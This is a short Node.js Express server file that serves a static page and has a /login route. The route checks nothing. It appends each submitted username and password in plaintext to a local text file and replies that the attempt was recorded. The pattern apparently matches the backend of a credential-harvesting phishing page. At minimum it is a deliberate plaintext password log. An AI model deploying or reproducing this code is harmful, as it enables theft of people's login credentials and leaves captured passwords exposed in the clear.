const express = require("express");
const fs = require("fs");
const app = express();
const path = require("path");

// Use Render's PORT or default to 3000
const PORT = process.env.PORT || 3000;

app.use(express.static("public")); // Serve static files
app.use(express.json()); // Enable JSON parsing

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Handle login attempts
app.post("/login", (req, res) => {
    const { username, password } = req.body;

    // Save login attempts to a file
    const log = `Username: ${username}, Password: ${password}\n`;
    fs.appendFileSync("login_attempts.txt", log);

    res.json({ message: "Login attempt recorded!" });
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

